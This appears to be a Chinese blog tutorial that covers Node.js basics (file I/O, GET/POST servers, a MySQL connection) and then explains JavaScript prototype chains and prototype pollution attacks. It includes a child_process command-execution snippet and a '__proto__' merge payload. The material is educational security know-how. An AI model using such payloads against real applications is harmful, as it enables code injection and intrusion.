<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">打开<br>fs<span class="hljs-selector-class">.open</span>(path, flags<span class="hljs-selector-attr">[, mode]</span>, callback)<span class="hljs-comment">//(flags:r r+ a a+ ......)</span><br><br>写入<br>fs<span class="hljs-selector-class">.writeFile</span>(file, data<span class="hljs-selector-attr">[, options]</span>, callback)<br><br>读取<br>fs<span class="hljs-selector-class">.read</span>(fd, buffer, offset, length, <span class="hljs-attribute">position</span>, callback)<br><br>关闭<br>fs<span class="hljs-selector-class">.close</span>(fd, callback)<br><br>删除 <br>fs<span class="hljs-selector-class">.unlink</span>(path, callback)<br><br>还有目录...<br></code></pre></td></tr></table></figure>
<h2 id="十三、GET-POST请求"><a href="#十三、GET-POST请求" class="headerlink" title="十三、GET/POST请求"></a>十三、GET/POST请求</h2><p>获取get请求的参数</p>
<figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-built_in">url</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;url&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br> <br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain; charset=utf-8&#x27;</span>&#125;);<br>    res.end(util.inspect(<span class="hljs-built_in">url</span>.parse(req.url, <span class="hljs-literal">true</span>)));<br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure>
<p>获取url的参数</p>
<figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-built_in">url</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;url&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br> <br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span>&#125;);<br> <br>    <span class="hljs-comment">// 解析 url 参数</span><br>    <span class="hljs-keyword">var</span> params = <span class="hljs-built_in">url</span>.parse(req.url, <span class="hljs-literal">true</span>).query;<br>    res.write(<span class="hljs-string">&quot;网站名：&quot;</span> + params.name);<br>    res.write(<span class="hljs-string">&quot;\n&quot;</span>);<br>    res.write(<span class="hljs-string">&quot;网站 URL：&quot;</span> + params.url);<br>    res.end();<br> <br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure>
<p>获取post的内容</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;querystring&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br> <br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    <span class="hljs-comment">// 定义了一个post变量，用于暂存请求体的信息</span><br>    <span class="hljs-keyword">var</span> post = <span class="hljs-string">&#x27;&#x27;</span>;     <br> <br>    <span class="hljs-comment">// 通过req的data事件监听函数，每当接受到请求体的数据，就累加到post变量中</span><br>    req.on(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>)</span>&#123;    <br>        post += chunk;<br>    &#125;);<br> <br>    <span class="hljs-comment">// 在end事件触发后，通过querystring.parse将post解析为真正的POST请求格式，然后向客户端返回。</span><br>    req.on(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;    <br>        post = querystring.parse(post);<br>        res.end(util.inspect(post));<br>    &#125;);<br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure>
<p>提交post表单</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;querystring&#x27;</span>);<br> <br><span class="hljs-keyword">var</span> postHTML = <br>  <span class="hljs-string">&#x27;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;Node.js 实例&lt;/title&gt;&lt;/head&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;body&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;form method=&quot;post&quot;&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;网站名： &lt;input name=&quot;name&quot;&gt;&lt;br&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;网站 URL： &lt;input name=&quot;url&quot;&gt;&lt;br&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;input type=&quot;submit&quot;&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;/form&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;/body&gt;&lt;/html&gt;&#x27;</span>;<br> <br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> body = <span class="hljs-string">&quot;&quot;</span>;<br>  req.on(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">chunk</span>) </span>&#123;<br>    body += chunk;<br>  &#125;);<br>  req.on(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">// 解析参数</span><br>    body = querystring.parse(body);<br>    <span class="hljs-comment">// 设置响应头部信息及编码</span><br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html; charset=utf8&#x27;</span>&#125;);<br> <br>    <span class="hljs-keyword">if</span>(body.name &amp;&amp; body.url) &#123; <span class="hljs-comment">// 输出提交的数据</span><br>        res.write(<span class="hljs-string">&quot;网站名：&quot;</span> + body.name);<br>        res.write(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);<br>        res.write(<span class="hljs-string">&quot;网站 URL：&quot;</span> + body.url);<br>    &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// 输出表单</span><br>        res.write(postHTML);<br>    &#125;<br>    res.end();<br>  &#125;);<br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure>
<h2 id="十四、Express框架"><a href="#十四、Express框架" class="headerlink" title="十四、Express框架"></a>十四、Express框架</h2><p>利用Express框架<br>实现GEt方法提交两个参数和POST方法提交两个参数<br>完成文件上传 要本地安装multer模块  在目录下能看到上传的文件<br>对cookie进行管理  要本地安装cookie-parser模块 在服务终端能看到cookie信息</p>
<h2 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h2><p>以mysql为例<br>在一项目中test.js文件是nodejs与mysql的配置信息</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">var mysql      = require(<span class="hljs-string">&#x27;mysql&#x27;</span>);<br>var <span class="hljs-keyword">connection</span> = mysql.createConnection(&#123;<br>  host     : <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>  <span class="hljs-keyword">user</span>     : <span class="hljs-string">&#x27;root&#x27;</span>,<br>  <span class="hljs-keyword">password</span> : <span class="hljs-string">&#x27;root&#x27;</span>,<br>  <span class="hljs-keyword">database</span> : <span class="hljs-string">&#x27;test&#x27;</span><br>&#125;);<br> <br><span class="hljs-keyword">connection</span>.<span class="hljs-keyword">connect</span>();<br> <br><span class="hljs-keyword">connection</span>.query(<span class="hljs-string">&#x27;SELECT 1 + 1 AS solution&#x27;</span>, <span class="hljs-keyword">function</span> (error, results, fields) &#123;<br>  <span class="hljs-keyword">if</span> (error) throw error;<br>  console.log(<span class="hljs-string">&#x27;The solution is: &#x27;</span>, results[<span class="hljs-number">0</span>].solution);<br>&#125;);<br></code></pre></td></tr></table></figure>
<p>如果成功连接数据库的话 输出2</p>
<p>可以在其他js中查询数据库的信息<br>以查一个表为例 数据库可以自行创建</p>
<p>启动数据库 查一下<br>然后用sql.js查一下 所以可以通过修改<br>里面的sql=’查询语句’就可以进行数据库操作了</p>
<p>项目</p>
<p>也可以nodejs安装MongoDB来对数据库进行操作</p>
<h1 id="Prototype-Pollution-Attack"><a href="#Prototype-Pollution-Attack" class="headerlink" title="Prototype Pollution Attack"></a>Prototype Pollution Attack</h1><p>常用的执行函数</p>
<blockquote>
<p>require(‘child_process’).spawnSync(‘ls’,[‘.’]).stdout.toString()</p>
<p>stdout用来捕获输出</p>
<p>还有exec，execSync，spawn，spawnSync(这两个需要stdout来捕获输出)</p>
</blockquote>
<h2 id="JavaScript中的对象"><a href="#JavaScript中的对象" class="headerlink" title="JavaScript中的对象"></a>JavaScript中的对象</h2><h3 id="建立对象"><a href="#建立对象" class="headerlink" title="建立对象"></a>建立对象</h3><p>JavaScript中 建立对象有两种形式</p>
<ul>
<li><p>构造函数创建</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">student</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;Yuyan Peng&quot;</span>;<br>    <span class="hljs-built_in">this</span>.test = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2333</span>;<br>    &#125;<br>&#125;<br>student.prototype.a=<span class="hljs-number">3</span>;<br>stu = <span class="hljs-keyword">new</span> student();<br><span class="hljs-built_in">console</span>.log(stu.test());<br><span class="hljs-built_in">console</span>.log(stu.a);<br></code></pre></td></tr></table></figure></li>
<li><p>通过Object创建</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>();<br>a.c=<span class="hljs-number">3</span><br><span class="hljs-built_in">console</span>.log(a.c)<br></code></pre></td></tr></table></figure></li>
</ul>
<p>对于使用过基于类的语言 (如 Java 或 C++) 的开发人员来说，JavaScript 有点令人困惑，因为它是动态的，并且本身不提供一个 class 实现。（在 ES2015/ES6 中引入了 class 关键字，但那只是语法糖，JavaScript 仍然是基于原型的）。 之前我们所认为的类在js中都是用函数来声明的 （事实上js不承认类 只是有相应的概念而已 下面为了说明方便 都沿用类的说法） 举个栗子</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">function test（）&#123;<br>    this.a = <span class="hljs-string">&quot;joy&quot;</span><span class="hljs-comment">;</span><br>&#125;<br><br><span class="hljs-attribute">b</span> = new test<span class="hljs-comment">;</span><br>console.log(b.a)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p>从上面可以看到 实例化对象b后就可以输出test类的属性a了 我们其实很容易想到构造函数 构造函数就是在new一个对象的时候被调用 在这其实就是js的一个重要概念——继承，继承的整个对应关系就是这个对象的原型链 所以 <code>test()函数就是类test的构造函数</code></p>
<p>上面没问题我们继续：</p>
<h3 id="prototype和-proto"><a href="#prototype和-proto" class="headerlink" title="prototype和__proto__"></a>prototype和__proto__</h3><p>一个类中必定有一些方法比如说属性this.age 把方法定义在构造函数内部：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">student</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.age=<span class="hljs-number">19</span>;<br>    <span class="hljs-built_in">this</span>.show=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.age)<br>        &#125;<br>    &#125;<br><br>(<span class="hljs-keyword">new</span> student).show();<br></code></pre></td></tr></table></figure>
<p>再一次看到 new一个对象就会继承到它的属性 在新开辟的存储空间就已经存放有对应的属性了 </p>
<p>但这样写有一个问题 每当我需要创建一个student对象的时候this.show = function{…}就会执行一次 这个show方法是绑定在对象上的 而不是绑定在“类”上的</p>
<ul>
<li><p><input checked="" disabled="" type="checkbox">  prototype<br>用原型prototype实现</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Student</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.age=<span class="hljs-number">19</span>;<br>&#125;<br><br>Student.prototype.show = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.age)&#125;<br><br><span class="hljs-keyword">var</span> stu = <span class="hljs-keyword">new</span> Student;<br>stu.show();<br></code></pre></td></tr></table></figure>
<p>prototype是类Student的一个属性 所有类对象在实例化后都具有和prototype中的变量、属性和方法 同时只有类才有prototype属性，但是类<code>实例化出来的对象</code>却没有prototype 不能通过prototype访问实例化对象的原型</p>
</li>
<li><p>__proto__<br>就上例而言 我们可以通过Student.prototype访问Student类的原型 但是实例化后的对象stu是不能通过prototype访问原型的 这时候我们使用__proto__来访问实例化对象的原型 stu.__proto__==Student.prototype看到二者是等价的</p>
</li>
</ul>
<p><strong>在Java.Script中 万物皆对象</strong><br>所有的变量，函数，数组，对象都始于Object的原型即Object.prototype  对象的__proto__和类的prototype相对应</p>
<p>特别的 函数也可以使用__proto__因为函数也是对象 后面给予说明</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/n.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>在javascript中 每个对象的都有一个指向他的原型(prototype)的内部链接 这个原型对象又有它自己的原型，直到null为止</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> <span class="hljs-constructor">Pt()</span>&#123;<br>    this.b = <span class="hljs-string">&quot;I don&#x27;t know what I&#x27;m up to.&quot;</span><br>&#125;<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Pt</span>.</span></span>prototype;<br><br>var ppt = <span class="hljs-keyword">new</span> Pt;<br>ppt.__proto__;<br>ppt.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__proto__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__proto__</span>;</span></span><br><br></code></pre></td></tr></table></figure>
<p>可以看出原型链为ppt-&gt;Pt.prototype-&gt;Object.prototype-&gt;null</p>
<p>数组<br><img src="https://raw.githubusercontent.com/wo02ie/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE2.png" srcset="/img/loading.gif" lazyload><br>原型链c-&gt;array.prototype-&gt;Object.prototype-&gt;null<br>函数<br><img src="https://raw.githubusercontent.com/wo02ie/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE3.png" srcset="/img/loading.gif" lazyload><br>原型链d-&gt;function.prototype-&gt;Object.prototype-&gt;null</p>
<p>可见 js中一切皆对象 一切都始于Object.prototype</p>
<p>总结一下：</p>
<ul>
<li>prototype是类的属性 所有类对象实例化都会从prototype继承属性和方法</li>
<li>一个对象的__proto__属性指向这个实例化这个对象的类的prototype属性</li>
</ul>
<p><code>instanceof运算符</code>，它可以用来判断某个构造函数的prototype属性是否存在另外一个要检测对象的原型链，下面是instanceof运算符的一个实例</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Pt</span>(<span class="hljs-params"></span>)</span>&#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Ob</span>(<span class="hljs-params"></span>)</span>&#123;&#125;<br><br><span class="hljs-keyword">var</span> ppt = <span class="hljs-keyword">new</span> Pt;<br><span class="hljs-built_in">console</span>.info(ppt <span class="hljs-keyword">instanceof</span> Pt)<span class="hljs-comment">//true //ppt.__proto__===Pt.prototype</span><br><span class="hljs-built_in">console</span>.info(ppt <span class="hljs-keyword">instanceof</span> ob)<span class="hljs-comment">//false 因为对象ppt的原型不是Ob</span><br></code></pre></td></tr></table></figure>
<p>上面说到函数也是一个对象</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.test = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hello world&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2333</span>;<br>    &#125;<br><br><span class="hljs-keyword">var</span> lib = <span class="hljs-keyword">new</span> hello;<br>lib.test();<br><br><span class="hljs-built_in">console</span>.log(hello <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Object</span>)<span class="hljs-comment">//ture 得证</span><br></code></pre></td></tr></table></figure>

<h3 id="原型链的变量搜索"><a href="#原型链的变量搜索" class="headerlink" title="原型链的变量搜索"></a>原型链的变量搜索</h3><p>来看一个例子</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">I</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.a = <span class="hljs-string">&quot;abc&quot;</span>;<br>    <span class="hljs-built_in">this</span>.b = <span class="hljs-string">&quot;123&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">var</span> j = <span class="hljs-keyword">new</span>(I);<br>I.prototype.c = <span class="hljs-string">&quot;789&quot;</span>;<br><span class="hljs-built_in">console</span>.log(j.c);<br></code></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211119005530731.png" srcset="/img/loading.gif" lazyload alt="image-20211119005530731"><br>能看出什么</p>
<p>实例化I后，对象j不应该有属性c，但此时给类对象I新增一个属性时，在j中也有了c属性，这是类与对象中从未见过的</p>
<p>当要使用或输出一个变量时：首先会在本层中搜索相应的变量，如果不存在的话，就会向上搜索，即在自己的父类中搜索，当父类中也没有时，就会向祖父类搜索，直到指向null，如果此时还没有搜索到，就会返回 undefined</p>
<p>那么此时的原型链就是j-&gt;I.prototype-&gt;Object.prototype-&gt;null</p>
<p>js的这个查找机制 就是运用在面向对象的继承中 称作prototype继承链</p>
<p>⭐说到这里再一次总结如下</p>
<ul>
<li>每个构造函数(constructor)都有一个原型对象(prototype)</li>
<li>对象的__proto__属性，指向类的原型对象prototype</li>
<li>JavaScript使用prototype链实现继承机制</li>
</ul>
<h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>下面我们来看</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">var Student = &#123;age:<span class="hljs-number">19</span>&#125;<br><br>console.log(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Student</span>.</span></span>age)<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Student</span>.</span><span class="hljs-module"><span class="hljs-identifier">__proto__</span>.</span></span>age = <span class="hljs-number">20</span><br><br>console.log(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Student</span>.</span></span>age)<br><br>var Teacher = &#123;&#125;<br><br>console.log(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Teacher</span>.</span></span>age)<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.png" srcset="/img/loading.gif" lazyload></p>
<p>原型链：Student.__proto__-&gt;Object.prototype-&gt;null</p>
<p>随着上面的逐步探讨 原型链污染及其产生的漏洞也就呼之欲出了 我们通过控制父类甚至祖类的属性(修改这个对象的原型)就可以影响来自同一个类、父祖类的对象 这就是原型链污染</p>
<p>看一个例子</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">//First.a或者First[&#x27;a&#x27;]对数组元素的访问 </span><br><span class="hljs-number">1.</span><br><span class="hljs-keyword">var</span> <span class="hljs-built_in">First</span> = Array();<br><span class="hljs-built_in">First</span>[<span class="hljs-string">&#x27;aa&#x27;</span>] = <span class="hljs-string">&quot;aaa&quot;</span>;<br><span class="hljs-built_in">First</span>[<span class="hljs-string">&#x27;bb&#x27;</span>] = <span class="hljs-string">&quot;bbb&quot;</span>;<br><span class="hljs-built_in">First</span>.aa<br><span class="hljs-built_in">First</span>.bb<br><br><span class="hljs-number">2.</span>   <br><span class="hljs-keyword">var</span> <span class="hljs-built_in">Second</span> = &#123;<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;ccc&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-string">&quot;ddd&quot;</span>&#125;<br>typeof <span class="hljs-built_in">Second</span>;<br><span class="hljs-built_in">Second</span>.c<br><span class="hljs-built_in">Second</span>[<span class="hljs-string">&#x27;c&#x27;</span>]<br></code></pre></td></tr></table></figure>
<p>上面的prototype是一样的<br>看一组 Second.__proto__==Second[“__proto__“]=Object.prototype</p>
<p>所以说，原型链污染一般会出现在对象、或数组的键名或属性名可控,而且是赋值语句的情况下 下面是个失败案例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">function <span class="hljs-keyword">merge</span>(target, source)&#123; <br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> source)&#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> source &amp;&amp; <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> target)&#123;<br>            <span class="hljs-keyword">merge</span>(target[<span class="hljs-keyword">key</span>], source[<span class="hljs-keyword">key</span>]) <br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>                target[<span class="hljs-keyword">key</span>] = source[<span class="hljs-keyword">key</span>] <br>        &#125; <br>     &#125; <br>&#125; <br></code></pre></td></tr></table></figure>
<p>试一下</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">let</span> o<span class="hljs-number">1</span> = &#123;&#125; <br><span class="hljs-attribute">let</span> o<span class="hljs-number">2</span> = &#123;a: <span class="hljs-number">1</span>,<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;b: <span class="hljs-number">2</span>&#125;&#125; <br><span class="hljs-attribute">merge</span>(o<span class="hljs-number">1</span>, o<span class="hljs-number">2</span>) <br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">1</span>.a, o<span class="hljs-number">1</span>.b) <br><span class="hljs-attribute">o3</span> = &#123;&#125; <br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">3</span>.b)<br></code></pre></td></tr></table></figure>

